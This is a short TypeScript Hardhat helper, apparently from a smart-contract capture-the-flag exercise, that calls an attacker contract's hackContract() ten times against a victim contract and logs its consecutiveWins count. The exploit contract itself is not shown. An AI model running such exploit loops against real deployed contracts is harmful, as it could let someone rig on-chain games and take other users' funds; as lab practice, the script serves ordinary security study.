import { expect } from "chai";
import { ethers } from "hardhat";

const helper = async (victim: any, attacker: any) => {
  for (let i = 0; i < 10; i++) {
    await attacker.hackContract();
    console.log("Consecutive Wins:", parseInt(await victim.consecutiveWins()));
  }
};

export default helper;
